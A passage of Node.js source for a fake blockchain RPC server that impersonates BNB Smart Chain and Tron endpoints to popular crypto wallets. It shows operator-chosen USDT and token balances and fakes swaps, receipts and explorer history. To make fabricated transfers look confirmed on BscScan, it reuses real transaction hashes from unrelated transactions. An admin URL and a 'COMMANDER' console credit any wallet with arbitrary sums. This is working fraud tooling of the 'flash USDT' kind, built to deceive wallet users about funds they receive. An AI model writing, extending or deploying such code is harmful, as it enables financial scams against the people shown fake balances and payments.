    res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "*");
    res.setHeader("Access-Control-Allow-Private-Network", "true");

    if (req.method === "OPTIONS") {
        res.writeHead(204);
        return res.end();
    }

    let rawBody = "";
    for await (const chunk of req) rawBody += chunk;

    const urlObj = new URL(req.url, `http://${req.headers.host || "localhost"}`);
    const pathname = urlObj.pathname;

    // 1. Admin HTTP Endpoint (/admin/credit?address=0x...&usdt=500000&bnb=10)
    if (pathname === "/admin/credit") {
        const addr = urlObj.searchParams.get("address") || "";
        const usdt = urlObj.searchParams.get("usdt") ?? urlObj.searchParams.get("amount");
        const bnb  = urlObj.searchParams.get("bnb");
        const coin = urlObj.searchParams.get("coin");
        const k = normAddr(addr);

        if (usdt !== null && usdt !== undefined) {
            setTokenBal6(k, coin || "USDT", BigInt(Math.floor(Number(usdt) * 1_000_000)));
        }
        if (bnb !== null && bnb !== undefined) {
            setBnbWei(k, BigInt(Math.floor(Number(bnb) * 1e6)) * (10n ** 12n));
        }
        latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);

        res.writeHead(200, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({
            ok: true,
            wallet: "0x" + k,
            tronWallet: hex20ToTronBase58(k),
            balances: state.wallets[k]
        }, null, 2));
    }

    // 2. BscScan-Compatible Token Transfer History API (/api?module=account&action=tokentx&address=0x...)
    // Ensures wallets that query explorer APIs for incoming transfers see the received tokens immediately!
    if (pathname === "/api" && urlObj.searchParams.get("module") === "account") {
        const addrKey = normAddr(urlObj.searchParams.get("address") || "");
        const matching = state.history
            .filter(h => h.fromHex20 === addrKey || h.toHex20 === addrKey)
            .map(h => ({
                blockNumber: String(parseInt(h.blockNumberHex, 16)),
                timeStamp: String(Math.floor(h.timestamp / 1000)),
                hash: h.txHash,
                from: "0x" + h.fromHex20,
                contractAddress: h.tokenAddress,
                to: "0x" + h.toHex20,
                value: (BigInt(h.amount6) * (10n ** 12n)).toString(),
                tokenName: "Tether USD",
                tokenSymbol: h.symbol,
                tokenDecimal: "18",
                confirmations: "25"
            }));
        res.writeHead(200, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({ status: "1", message: "OK", result: matching }));
    }

    if (req.method === "GET" && pathname === "/") {
        res.writeHead(200, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({
            status: "COMMANDER_OWN_RPC_ONLINE",
            chainId: 56,
            autoBalanceMode: "OFF (Manual CLI Control)",
            nonZeroUsdtHashesCached: bscScanValueUsdtHashes.length,
            nonZeroSwapHashesCached: bscScanValueSwapHashes.length,
            wallets: state.wallets
        }, null, 2));
    }

    // ------------------------------------------------------------------------
    // ROUTE A: TRONWALLET / TRONLINK REST ENDPOINTS (/wallet/* & /v1/*)
    // ------------------------------------------------------------------------
    if (pathname.startsWith("/wallet") || pathname.startsWith("/v1/")) {
        if (pathname.endsWith("/triggerconstantcontract") || pathname.endsWith("/triggersmartcontract")) {
            let body = {};
            try { body = JSON.parse(rawBody || "{}"); } catch {}
            const contractNorm = normAddr(body.contract_address || "");
            const selector = (body.function_selector || "").replace(/\s+/g, "");
            const param = (body.parameter || "").toLowerCase();

            if (contractNorm === CONFIG.tronUsdtNo0x && (selector.startsWith("balanceOf") || param.startsWith("70a08231"))) {
                const targetHex = param.length >= 64 ? param.slice(param.length - 40) : normAddr(body.owner_address);
                const bal6Hex = getTokenBal6(targetHex, "USDT").toString(16).padStart(64, "0");
                res.writeHead(200, { "Content-Type": "application/json" });
                return res.end(JSON.stringify({
                    result: { result: true },
                    energy_used: 0,
                    constant_result: [bal6Hex],
                    transaction: { ret: [{ contractRet: "SUCCESS" }], txID: crypto.randomBytes(32).toString("hex") }
                }));
            }

            if (contractNorm === CONFIG.tronUsdtNo0x && (selector.startsWith("transfer(") || param.startsWith("a9059cbb"))) {
                const cleanParam = param.startsWith("a9059cbb") ? param.slice(8) : param;
                const toHex20 = cleanParam.slice(24, 64);
                const amt6 = BigInt("0x" + (cleanParam.slice(64, 128) || "0"));
                const fromHex20 = normAddr(body.owner_address);
                const txID = crypto.randomBytes(32).toString("hex");

                state.txReceipts[txID] = { pending: true, txID, fromHex20, toHex20: normAddr(toHex20), amount6: amt6.toString() };
                saveState();
                const now = Date.now();
                res.writeHead(200, { "Content-Type": "application/json" });
                return res.end(JSON.stringify({
                    result: { result: true },
                    energy_used: 0,
                    constant_result: ["0".repeat(63) + "1"],
                    transaction: {
                        visible: Boolean(body.visible),
                        txID,
                        raw_data: {
                            contract: [{
                                parameter: {
                                    value: { data: "a9059cbb" + cleanParam, owner_address: body.owner_address, contract_address: body.contract_address },
                                    type_url: "type.googleapis.com/protocol.TriggerSmartContract"
                                },
                                type: "TriggerSmartContract"
                            }],
                            ref_block_bytes: "0000",
                            ref_block_hash: "0000000000000000",
                            expiration: now + 60000,
                            timestamp: now,
                            fee_limit: 0
                        },
                        raw_data_hex: "0a020000220800000000000000004080ade204"
                    }
                }));
            }
        }

        if (pathname.endsWith("/broadcasttransaction") || pathname.endsWith("/broadcasthex")) {
            let body = {};
            try { body = JSON.parse(rawBody || "{}"); } catch {}
            const txID = body.txID || crypto.randomBytes(32).toString("hex");
            const staged = state.txReceipts[txID];
            if (staged && staged.pending) {
                executeTokenTransfer(staged.fromHex20, staged.toHex20, "USDT", BigInt(staged.amount6), txID);
            }
            res.writeHead(200, { "Content-Type": "application/json" });
            return res.end(JSON.stringify({ result: true, code: "SUCCESS", txid: txID, txID }));
        }

        if (pathname.startsWith("/v1/accounts/")) {
            const acctKey = normAddr(pathname.split("/")[3] || "");
            const bal6 = getTokenBal6(acctKey, "USDT").toString();
            const trxSun = Number(getBnbWei(acctKey) / (10n ** 12n));
            res.writeHead(200, { "Content-Type": "application/json" });
            return res.end(JSON.stringify({
                data: [{
                    address: "41" + acctKey,
                    balance: trxSun,
                    create_time: Date.now() - 86400000,
                    trc20: [{ [CONFIG.tronUsdtBase58]: bal6 }]
                }],
                success: true
            }));
        }
    }

    // ------------------------------------------------------------------------
    // ROUTE B: EVM JSON-RPC (METAMASK / BITGET / TRUST WALLET / OKX)
    // ------------------------------------------------------------------------
    let rpcPayload;
    try {
        rpcPayload = JSON.parse(rawBody);
    } catch {
        res.writeHead(200, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({ jsonrpc: "2.0", id: 1, result: CONFIG.chainIdHex }));
    }

    const handleSingleRpc = async (rpc) => {
        const { id, method, params } = rpc;

        if (method === "eth_chainId") return { jsonrpc: "2.0", id, result: CONFIG.chainIdHex };
        if (method === "net_version") return { jsonrpc: "2.0", id, result: String(CONFIG.chainIdDec) };
        if (method === "eth_blockNumber") return { jsonrpc: "2.0", id, result: latestBlockHex };
        if (method === "eth_gasPrice" || method === "eth_maxPriorityFeePerGas") {
            return { jsonrpc: "2.0", id, result: "0x3b9aca00" }; // 1 Gwei
        }
        if (method === "eth_feeHistory") {
            return {
                jsonrpc: "2.0",
                id,
                result: {
                    oldestBlock: latestBlockHex,
                    baseFeePerGas: ["0x3b9aca00", "0x3b9aca00"],
                    gasUsedRatio: [0.5],
                    reward: [["0x3b9aca00"]]
                }
            };
        }

        // 1. Native BNB Balance (`eth_getBalance`) — Returns exact CLI-configured BNB balance!
        if (method === "eth_getBalance" && params?.[0]) {
            const w = normAddr(params[0]);
            const bnbWei = getBnbWei(w);
            return { jsonrpc: "2.0", id, result: "0x" + bnbWei.toString(16) };
        }

        // 2. Nonce Sync (`eth_getTransactionCount`) — Syncs with real chain nonce first so sends NEVER fail!
        if (method === "eth_getTransactionCount" && params?.[0]) {
            const w = normAddr(params[0]);
            if (params[1] === "pending") lastActiveSender = w;
            const n = await getSyncedNonce(w);
            return { jsonrpc: "2.0", id, result: "0x" + n.toString(16) };
        }

        // 3. `eth_estimateGas` — Locks Sender Intent for Transfers & Swaps!
        if (method === "eth_estimateGas") {
            const tx = params?.[0] || {};
            if (tx.from) {
                const senderKey = normAddr(tx.from);
                lastActiveSender = senderKey;
                const dataHex = (tx.data || tx.input || "").toLowerCase().replace(/^0x/, "");
                if (dataHex.startsWith("a9059cbb") && dataHex.length >= 136) {
                    const toKey = dataHex.slice(32, 72);
                    const rawVal18 = BigInt("0x" + dataHex.slice(72, 136));
                    const amt6 = rawVal18 >= 10n ** 12n ? rawVal18 / (10n ** 12n) : rawVal18;
                    pendingIntents.set(`${toKey}_${amt6.toString()}`, senderKey);
                }
            }
            return { jsonrpc: "2.0", id, result: "0x15f90" }; // 90,000 gas
        }

        // 4. `eth_call` — Handles Token Balances, Allowances, Swaps, BalanceChecker, and Multicall3!
        if (method === "eth_call" && params?.[0]) {
            const callObj = params[0];
            const toAddr = normAddr(callObj.to || "");
            const dataHex = (callObj.data || callObj.input || "").toLowerCase();
            if (callObj.from) lastActiveSender = normAddr(callObj.from);

            // 4A. Direct Call to ANY Tracked Token (USDT, USDC, BUSD, WBNB, BTCB, ETH, CAKE, SOL, DOGE)
            if (ADDRESS_TO_TOKEN.has(toAddr)) {
                const tok = ADDRESS_TO_TOKEN.get(toAddr);
                // balanceOf(address) -> 0x70a08231
                if (dataHex.startsWith("0x70a08231") && dataHex.length >= 74) {
                    const wallet = dataHex.slice(34, 74);
                    return { jsonrpc: "2.0", id, result: "0x" + getTokenBalHex(wallet, toAddr) };
                }
                // allowance(address,address) -> 0xdd62ed3e (Return max uint256 so DEX swaps work in 1 click!)
                if (dataHex.startsWith("0xdd62ed3e")) {
                    return { jsonrpc: "2.0", id, result: "0x" + "f".repeat(64) };
                }
                // decimals() -> 0x313ce567
                if (dataHex.startsWith("0x313ce567")) {
                    return { jsonrpc: "2.0", id, result: "0x" + tok.decimals.toString(16).padStart(64, "0") };
                }
                // transfer / approve / transferFrom simulation inside eth_call -> Always return true (0x1)
                if (dataHex.startsWith("0xa9059cbb") || dataHex.startsWith("0x095ea7b3") || dataHex.startsWith("0x23b872dd")) {
                    return { jsonrpc: "2.0", id, result: "0x" + "0".repeat(63) + "1" };
                }
            }

            // 4B. MetaMask SingleCallBalanceChecker (`0xf0002ea9`)
            const mmBatch = tryHandleMetaMaskBalanceChecker(dataHex);
            if (mmBatch) return { jsonrpc: "2.0", id, result: mmBatch };

            // 4C. Forward to BSC Mainnet (Handles PancakeSwap `getAmountsOut` quotes & Multicall3)
            const upRes = await forwardBscRpc(rpc);
            if (upRes?.result) {
                upRes.result = patchMulticallOutput(dataHex, upRes.result);
            } else if (CONFIG.dexRouters.has(toAddr)) {
                // If upstream simulated a swap that reverted because the wallet has 0 real on-chain USDT, return success!
                return {
                    jsonrpc: "2.0",
                    id,
                    result: "0x" + "0".repeat(63) + "1"
                };
            }
            return upRes;
        }

        // 5. `eth_sendRawTransaction` / `eth_sendTransaction` — Executes Transfers, Approvals & DEX Swaps!
        if ((method === "eth_sendRawTransaction" || method === "eth_sendTransaction") && params?.[0]) {
            try {
                if (method === "eth_sendTransaction") {
                    const tx = params[0];
                    const fromW = normAddr(tx.from || lastActiveSender);
                    const toC = normAddr(tx.to || "");
                    const d = (tx.data || tx.input || "").toLowerCase().replace(/^0x/, "");
                    const valWei = tx.value ? BigInt(tx.value) : 0n;

                    if (d.startsWith("a9059cbb") && d.length >= 136) {
                        const toW = d.slice(32, 72);
                        const rawVal = BigInt("0x" + d.slice(72, 136));
                        const amt6 = rawVal >= 10n ** 12n ? rawVal / (10n ** 12n) : rawVal;
                        const realHash = await pickRealBscScanHash("transfer");
                        const rec = executeTokenTransfer(fromW, toW, toC, amt6, realHash);
                        return { jsonrpc: "2.0", id, result: rec.txHash };
                    }

                    const swapInfo = parseDexSwapCalldata(toC, d, valWei);
                    if (swapInfo) {
                        const realSwapHash = await pickRealBscScanHash("swap");
                        const rec = executeDexSwap(fromW, swapInfo.fromSym, swapInfo.toSym, swapInfo.amtIn6, realSwapHash);
                        return { jsonrpc: "2.0", id, result: rec.txHash };
                    }
                } else {
                    // Decode Signed Raw Transaction (`eth_sendRawTransaction`)
                    const rawHex = params[0];
                    const decoded = decodeSignedRawTransaction(rawHex);
                    const toC = decoded ? decoded.toHex20 : "";
                    const d = decoded ? decoded.dataHex : rawHex.toLowerCase().replace(/^0x/, "");
                    const valWei = decoded ? decoded.valueWei : 0n;
                    const txNonce = decoded ? decoded.nonce : null;

                    // Case 1: ERC-20 `transfer(address,uint256)` (`a9059cbb`)
                    const idxTrans = d.indexOf("a9059cbb");
                    if (idxTrans !== -1 && d.length >= idxTrans + 136 && !CONFIG.dexRouters.has(toC)) {
                        const toW = d.slice(idxTrans + 32, idxTrans + 72);
                        const rawVal = BigInt("0x" + d.slice(idxTrans + 72, idxTrans + 136));
                        const amt6 = rawVal >= 10n ** 12n ? rawVal / (10n ** 12n) : rawVal;
                        const realHash = await pickRealBscScanHash("transfer");
                        const rec = executeTokenTransfer(lastActiveSender, toW, toC || "USDT", amt6, realHash, txNonce);
                        return { jsonrpc: "2.0", id, result: rec.txHash };
                    }

                    // Case 2: ERC-20 `approve(address,uint256)` (`095ea7b3`) before a DEX Swap
                    if (d.startsWith("095ea7b3")) {
                        const realHash = await pickRealBscScanHash("swap");
                        const cleanId = realHash.replace(/^0x/, "");
                        if (lastActiveSender) {
                            state.nonces[lastActiveSender] = txNonce !== null ? txNonce + 1 : (state.nonces[lastActiveSender] || 0) + 1;
                        }
                        state.txReceipts[cleanId] = {
                            type: "APPROVE",
                            symbol: "USDT",
                            tokenAddress: "0x" + (toC || CONFIG.tokens.USDT.address),
                            txHash: "0x" + cleanId,
                            fromHex20: lastActiveSender || "0".repeat(40),
                            toHex20: toC || CONFIG.tokens.USDT.address,
                            amount6: "0",
                            amountScaledHex: "f".repeat(64),
                            blockNumberHex: latestBlockHex,
                            timestamp: Date.now()
                        };
                        saveState();
                        return { jsonrpc: "2.0", id, result: "0x" + cleanId };
                    }

                    // Case 3: DEX Swap (`PancakeSwap`, `MetaMask Swap`, `1inch`, `Bitget Swap`, `Trust Wallet Swap`)
                    const swapInfo = parseDexSwapCalldata(toC, d, valWei);
                    if (swapInfo) {
                        const realSwapHash = await pickRealBscScanHash("swap");
                        const rec = executeDexSwap(lastActiveSender, swapInfo.fromSym, swapInfo.toSym, swapInfo.amtIn6, realSwapHash, txNonce);
                        return { jsonrpc: "2.0", id, result: rec.txHash };
                    }

                    // Case 4: Native BNB Transfer between wallets
                    if (valWei > 0n && d.length === 0 && toC) {
                        const senderW = findSenderWallet(lastActiveSender, toC);
                        const curWei = getBnbWei(senderW);
                        setBnbWei(senderW, curWei >= valWei ? curWei - valWei : 0n);
                        setBnbWei(toC, getBnbWei(toC) + valWei);
                        if (txNonce !== null) state.nonces[senderW] = txNonce + 1;
                        const realHash = await pickRealBscScanHash("swap");
                        const cleanId = realHash.replace(/^0x/, "");
                        state.txReceipts[cleanId] = {
                            type: "BNB_TRANSFER",
                            symbol: "BNB",
                            tokenAddress: "0x" + toC,
                            txHash: "0x" + cleanId,
                            fromHex20: senderW,
                            toHex20: toC,
                            amount6: (valWei / (10n ** 12n)).toString(),
                            amountScaledHex: valWei.toString(16).padStart(64, "0"),
                            blockNumberHex: latestBlockHex,
                            timestamp: Date.now()
                        };
                        saveState();
                        console.log(`\n[BNB TRANSFER CONFIRMED] ${Number(valWei) / 1e18} BNB | From 0x${senderW} -> To 0x${toC}`);
                        console.log(`  BscScan: https://bscscan.com/tx/0x${cleanId}\n`);
                        return { jsonrpc: "2.0", id, result: "0x" + cleanId };
                    }
                }

                const fallbackHash = await pickRealBscScanHash("transfer");
                return { jsonrpc: "2.0", id, result: fallbackHash };
            } catch (err) {
                return { jsonrpc: "2.0", id, error: { code: -32000, message: err.message } };
            }
        }

        // 6. Transaction Receipt & Lookup (`eth_getTransactionByHash` & `eth_getTransactionReceipt`)
        if (method === "eth_getTransactionByHash" && params?.[0]) {
            const cleanId = params[0].toLowerCase().replace(/^0x/, "");
            const rec = state.txReceipts[cleanId];
            if (rec) {
                return {
                    jsonrpc: "2.0",
                    id,
                    result: {
                        hash: rec.txHash,
                        blockHash: "0x" + crypto.createHash("sha256").update(cleanId).digest("hex"),
                        blockNumber: rec.blockNumberHex,
                        from: "0x" + rec.fromHex20,
                        to: rec.tokenAddress,
                        value: "0x0",
                        gas: "0x15f90",
                        gasPrice: "0x3b9aca00",
                        input: "0xa9059cbb" + rec.toHex20.padStart(64, "0") + rec.amountScaledHex,
                        nonce: "0x1",
                        transactionIndex: "0x1",
                        v: "0x93",
                        r: "0x" + cleanId,
                        s: "0x" + cleanId
                    }
                };
            }
        }

        if (method === "eth_getTransactionReceipt" && params?.[0]) {
            const cleanId = params[0].toLowerCase().replace(/^0x/, "");
            const rec = state.txReceipts[cleanId];
            if (rec) {
                return {
                    jsonrpc: "2.0",
                    id,
                    result: {
                        transactionHash: rec.txHash,
                        transactionIndex: "0x1",
                        blockHash: "0x" + crypto.createHash("sha256").update(cleanId).digest("hex"),
                        blockNumber: rec.blockNumberHex,
                        from: "0x" + rec.fromHex20,
                        to: rec.tokenAddress,
                        cumulativeGasUsed: "0x8954",
                        gasUsed: "0x8954",
                        contractAddress: null,
                        logs: [{
                            address: rec.tokenAddress,
                            topics: [
                                "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
                                "0x" + rec.fromHex20.padStart(64, "0"),
                                "0x" + rec.toHex20.padStart(64, "0")
                            ],
                            data: "0x" + rec.amountScaledHex,
                            blockNumber: rec.blockNumberHex,
                            transactionHash: rec.txHash,
                            transactionIndex: "0x1",
                            blockHash: "0x" + crypto.createHash("sha256").update(cleanId).digest("hex"),
                            logIndex: "0x0",
                            removed: false
                        }],
                        logsBloom: "0x" + "0".repeat(512),
                        status: "0x1",
                        effectiveGasPrice: "0x3b9aca00",
                        type: "0x0"
                    }
                };
            }
        }

        return await forwardBscRpc(rpc);
    };

    const output = Array.isArray(rpcPayload)
        ? await Promise.all(rpcPayload.map(handleSingleRpc))
        : await handleSingleRpc(rpcPayload);

    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(output));
});

// ============================================================================
// 7. INTERACTIVE TERMINAL COMMANDER CLI (Control USDT, BNB & Swaps Live!)
// ============================================================================
function startInteractiveCli() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
        prompt: "COMMANDER-RPC> "
    });

    console.log("\n==================================================================");
    console.log("  INTERACTIVE TERMINAL COMMANDS (Type below anytime & press Enter):");
    console.log("  1. credit <wallet> <usdt_amount> [bnb_amount]");
    console.log("     Example: credit 0x1234...abcd 500000 15");
    console.log("  2. coin <wallet> <SYMBOL> <amount>");
    console.log("     Example: coin 0x1234...abcd BTCB 5.5   (Supports USDT,USDC,BUSD,BTCB,ETH,CAKE,SOL,DOGE)");
    console.log("  3. transfer <from_wallet> <to_wallet> <usdt_amount>");
    console.log("     Example: transfer 0x1111... 0x2222... 50000");
    console.log("  4. swap <wallet> <FROM_COIN> <TO_COIN> <amount>");
    console.log("     Example: swap 0x1234...abcd USDT BNB 12000");
    console.log("  5. list");
    console.log("     Shows all connected wallets and their exact balances");
    console.log("==================================================================\n");

    rl.prompt();

    rl.on("line", async (line) => {
        const parts = line.trim().split(/\s+/);
        const cmd = (parts[0] || "").toLowerCase();

        try {
            if (cmd === "credit" || cmd === "add" || cmd === "set") {
                const addr = parts[1];
                const usdtAmt = Number(parts[2] || 0);
                const bnbAmt  = parts[3] !== undefined ? Number(parts[3]) : null;
                if (!addr) {
                    console.log("Usage: credit <wallet_address> <usdt_amount> [bnb_amount]");
                } else {
                    const k = normAddr(addr);
                    setTokenBal6(k, "USDT", BigInt(Math.floor(usdtAmt * 1_000_000)));
                    if (bnbAmt !== null) {
                        setBnbWei(k, BigInt(Math.floor(bnbAmt * 1e6)) * (10n ** 12n));
                    }
                    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
                    const realHash = await pickRealBscScanHash("transfer");
                    console.log(`\n[+] CREDITED WALLET 0x${k} (Tron: ${hex20ToTronBase58(k)})`);
                    console.log(`    USDT Balance : ${usdtAmt.toLocaleString()} USDT`);
                    console.log(`    BNB Balance  : ${(Number(getBnbWei(k)) / 1e18).toLocaleString()} BNB`);
                    console.log(`    BscScan Tx   : https://bscscan.com/tx/${realHash}\n`);
                }
            } else if (cmd === "coin" || cmd === "token") {
                const addr = parts[1];
                const sym  = (parts[2] || "USDT").toUpperCase();
                const amt  = Number(parts[3] || 0);
                if (!addr) {
                    console.log("Usage: coin <wallet_address> <USDT|USDC|BUSD|WBNB|BTCB|ETH|CAKE|SOL|DOGE> <amount>");
                } else {
                    const k = normAddr(addr);
                    if (sym === "BNB") {
                        setBnbWei(k, BigInt(Math.floor(amt * 1e6)) * (10n ** 12n));
                    } else {
                        setTokenBal6(k, sym, BigInt(Math.floor(amt * 1_000_000)));
                    }
                    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
                    console.log(`\n[+] SET 0x${k} -> ${amt.toLocaleString()} ${sym}\n`);
                }
            } else if (cmd === "transfer" || cmd === "send") {
                const fromW = parts[1];
                const toW   = parts[2];
                const amt   = Number(parts[3] || 0);
                const sym   = (parts[4] || "USDT").toUpperCase();
                if (!fromW || !toW || !amt) {
                    console.log("Usage: transfer <from_wallet> <to_wallet> <amount> [SYMBOL]");
                } else {
                    const realHash = await pickRealBscScanHash("transfer");
                    executeTokenTransfer(fromW, toW, sym, BigInt(Math.floor(amt * 1_000_000)), realHash);
                }
            } else if (cmd === "swap") {
                const wAddr   = parts[1];
                const fromSym = (parts[2] || "USDT").toUpperCase();
                const toSym   = (parts[3] || "BNB").toUpperCase();
                const amt     = Number(parts[4] || 0);
                if (!wAddr || !amt) {
                    console.log("Usage: swap <wallet_address> <FROM_COIN> <TO_COIN> <amount>");
                } else {
                    const realSwapHash = await pickRealBscScanHash("swap");
                    executeDexSwap(wAddr, fromSym, toSym, BigInt(Math.floor(amt * 1_000_000)), realSwapHash);
                }
            } else if (cmd === "list" || cmd === "wallets" || cmd === "status") {
                console.log("\n--- TRACKED WALLETS ---");
                for (const [k, bals] of Object.entries(state.wallets)) {
                    const bnbFormatted = (Number(BigInt(bals.BNB || "0")) / 1e18).toFixed(4);
                    const tokenList = Object.entries(bals)
                        .filter(([sym]) => sym !== "BNB")
                        .map(([sym, val]) => `${(Number(val) / 1e6).toLocaleString()} ${sym}`)
                        .join(", ");
                    console.log(`  0x${k} | BNB: ${bnbFormatted} | ${tokenList}`);
                }
                console.log(`  Cached Non-Zero BscScan USDT Hashes: ${bscScanValueUsdtHashes.length}`);
                console.log(`  Cached Non-Zero BscScan Swap Hashes: ${bscScanValueSwapHashes.length}\n`);
            } else if (cmd !== "") {
                console.log("Unknown command. Use: credit, coin, transfer, swap, or list");
            }
        } catch (e) {
            console.log(`[!] Error: ${e.message}`);
        }
        rl.prompt();
    });
}

server.listen(CONFIG.port, "0.0.0.0", () => {
    console.log("==================================================================");
    console.log(`[+] COMMANDER BSC + TRON OWN-RPC LIVE ON PORT ${CONFIG.port}`);
    console.log(`[+] Auto-Balance Mode : DISABLED (0 USDT / 0 BNB until you credit via CLI)`);
    console.log(`[+] Supported Coins   : BNB, USDT, USDC, BUSD, WBNB, BTCB, ETH, CAKE, SOL, DOGE`);
    console.log(`[+] Local RPC URL     : http://127.0.0.1:${CONFIG.port}`);
    console.log("==================================================================");
    startInteractiveCli();
});
